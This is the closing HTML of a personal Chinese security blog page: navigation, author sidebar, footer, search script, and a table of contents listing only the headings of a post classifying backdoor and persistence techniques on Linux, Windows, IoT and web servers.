      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2016/12/22/linux-base/" rel="next" title="Linux 基础知识">
                <i class="fa fa-chevron-left"></i> Linux 基础知识
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2017/03/10/java-zip/" rel="prev" title="Java Zip">
                Java Zip <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </article>



    <div class="post-spread">
      
    </div>
  </div>

          
          </div>
          


          
  <div class="comments" id="comments">
    
  </div>


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/images/orleven.jpg"
               alt="Orleven" />
          <p class="site-author-name" itemprop="name">Orleven</p>
           
              <p class="site-description motion-element" itemprop="description">Life is full of ups and downs.</p>
          
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
              <a href="/archives">
                <span class="site-state-item-count">20</span>
                <span class="site-state-item-name">日志</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-categories">
              <a href="/categories/index.html">
                <span class="site-state-item-count">15</span>
                <span class="site-state-item-name">分类</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/tags/index.html">
                <span class="site-state-item-count">42</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/orleven" target="_blank" title="GitHub">
                  
                    <i class="fa fa-fw fa-github"></i>
                  
                  GitHub
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://www.weibo.com/u/3846125587" target="_blank" title="Weibo">
                  
                    <i class="fa fa-fw fa-weibo"></i>
                  
                  Weibo
                </a>
              </span>
            
          
        </div>

        
        

        
        
          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
            <div class="links-of-blogroll-title">
              <i class="fa  fa-fw fa-globe"></i>
              
            </div>
            <ul class="links-of-blogroll-list">
              
                <li class="links-of-blogroll-item">
                  <a href="https://www.warmeng.com/" title="warmeng" target="_blank">warmeng</a>
                </li>
              
                <li class="links-of-blogroll-item">
                  <a href="https://blog.0kami.cn/" title="0kimi" target="_blank">0kimi</a>
                </li>
              
            </ul>
          </div>
        

        


      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#概述"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#分类"><span class="nav-number">2.</span> <span class="nav-text">分类</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#终端平台"><span class="nav-number">3.</span> <span class="nav-text">终端平台</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux"><span class="nav-number">3.1.</span> <span class="nav-text">Linux</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#配置型"><span class="nav-number">3.1.1.</span> <span class="nav-text">配置型</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#crontab"><span class="nav-number">3.1.1.1.</span> <span class="nav-text">crontab</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ssh公钥免密"><span class="nav-number">3.1.1.2.</span> <span class="nav-text">ssh公钥免密</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#软连接后门"><span class="nav-number">3.1.1.3.</span> <span class="nav-text">软连接后门</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SSH-Server-wrapper"><span class="nav-number">3.1.1.4.</span> <span class="nav-text">SSH Server wrapper</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#logger型"><span class="nav-number">3.1.2.</span> <span class="nav-text">logger型</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#alias"><span class="nav-number">3.1.2.1.</span> <span class="nav-text">alias</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pam"><span class="nav-number">3.1.2.2.</span> <span class="nav-text">pam</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#openssh后门"><span class="nav-number">3.1.2.3.</span> <span class="nav-text">openssh后门</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rookit"><span class="nav-number">3.1.3.</span> <span class="nav-text">rookit</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#应用级rootkit"><span class="nav-number">3.1.3.1.</span> <span class="nav-text">应用级rootkit</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#内核级rookit"><span class="nav-number">3.1.3.2.</span> <span class="nav-text">内核级rookit</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#windows"><span class="nav-number">3.2.</span> <span class="nav-text">windows</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#registry型"><span class="nav-number">3.2.1.</span> <span class="nav-text">registry型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#schtasks型"><span class="nav-number">3.2.2.</span> <span class="nav-text">schtasks型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WMI型"><span class="nav-number">3.2.3.</span> <span class="nav-text">WMI型</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IOT"><span class="nav-number">3.3.</span> <span class="nav-text">IOT</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#进程"><span class="nav-number">3.3.1.</span> <span class="nav-text">进程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#防重启"><span class="nav-number">3.3.2.</span> <span class="nav-text">防重启</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#通信协议"><span class="nav-number">4.</span> <span class="nav-text">通信协议</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#通信方式类"><span class="nav-number">5.</span> <span class="nav-text">通信方式类</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#http-https型"><span class="nav-number">5.1.</span> <span class="nav-text">http/https型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#irc型"><span class="nav-number">5.2.</span> <span class="nav-text">irc型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#icmp型"><span class="nav-number">5.3.</span> <span class="nav-text">icmp型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dns型"><span class="nav-number">5.4.</span> <span class="nav-text">dns型</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#网站类"><span class="nav-number">6.</span> <span class="nav-text">网站类</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#模块扩展型"><span class="nav-number">6.1.</span> <span class="nav-text">模块扩展型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#apache"><span class="nav-number">6.1.1.</span> <span class="nav-text">apache</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ginx"><span class="nav-number">6.1.2.</span> <span class="nav-text">ginx</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#iis"><span class="nav-number">6.1.3.</span> <span class="nav-text">iis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP扩展库"><span class="nav-number">6.1.4.</span> <span class="nav-text">PHP扩展库</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#后端语言型"><span class="nav-number">6.2.</span> <span class="nav-text">后端语言型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#开发者后门"><span class="nav-number">6.2.1.</span> <span class="nav-text">开发者后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP后门"><span class="nav-number">6.2.2.</span> <span class="nav-text">PHP后门</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#配置文件型"><span class="nav-number">6.3.</span> <span class="nav-text">配置文件型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#htaccess后门"><span class="nav-number">6.3.1.</span> <span class="nav-text">.htaccess后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#user-ini后门"><span class="nav-number">6.3.2.</span> <span class="nav-text">.user.ini后门</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">7.</span> <span class="nav-text">总结</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy;  2016 - 
  <span itemprop="copyrightYear">2017</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Orleven</span>
</div>


<div class="powered-by">
    个人专属
</div>

<div class="theme-info">
  Orleven Blog 
</div>


        

        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    
    
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  




  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>



  



  




	





  





  





  



  
  
  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length == 0) {
      search_path = "search.xml";
    }
    var path = "/" + search_path;
    // monitor main search box;

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.popup').toggle();
    }
    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';
      $.ajax({
        url: path,
        dataType: "xml",
        async: true,
        success: function( xmlResponse ) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = $( "entry", xmlResponse ).map(function() {
            return {
              title: $( "title", this ).text(),
              content: $("content",this).text(),
              url: $( "url" , this).text()
            };
          }).get();
          var $input = document.getElementById(search_id);
          var $resultContent = document.getElementById(content_id);
          $input.addEventListener('input', function(){
            var matchcounts = 0;
            var str='<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length > 1) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var content_index = [];
                var data_title = data.title.trim().toLowerCase();
                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
                var data_url = decodeURIComponent(data.url);
                var index_title = -1;
                var index_content = -1;
                var first_occur = -1;
                // only match artiles with not empty titles and contents
                if(data_title != '') {
                  keywords.forEach(function(keyword, i) {
                    index_title = data_title.indexOf(keyword);
                    index_content = data_content.indexOf(keyword);
                    if( index_title >= 0 || index_content >= 0 ){
                      isMatch = true;
                      if (i == 0) {
                        first_occur = index_content;
                      }
                    }

                  });
                }
                // show search results
                if (isMatch) {
                  matchcounts += 1;
                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
                  var content = data.content.trim().replace(/<[^>]+>/g,"");
                  if (first_occur >= 0) {
                    // cut out 100 characters
                    var start = first_occur - 20;
                    var end = first_occur + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if(start == 0){
                      end = 50;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    var match_content = content.substring(start, end);
                    // highlight all keywords
                    keywords.forEach(function(keyword){
                      var regS = new RegExp(keyword, "gi");
                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
                    });

                    str += "<p class=\"search-result\">" + match_content +"...</p>"
                  }
                  str += "</li>";
                }
              })};
            str += "</ul>";
            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
            $resultContent.innerHTML = str;
          });
          proceedsearch();
        }
      });}

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched == false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(function(e){
      $('.popup').hide();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    });
    $('.popup').click(function(e){
      e.stopPropagation();
    });
  </script>


  

  

  

  


  

</body>
</html>
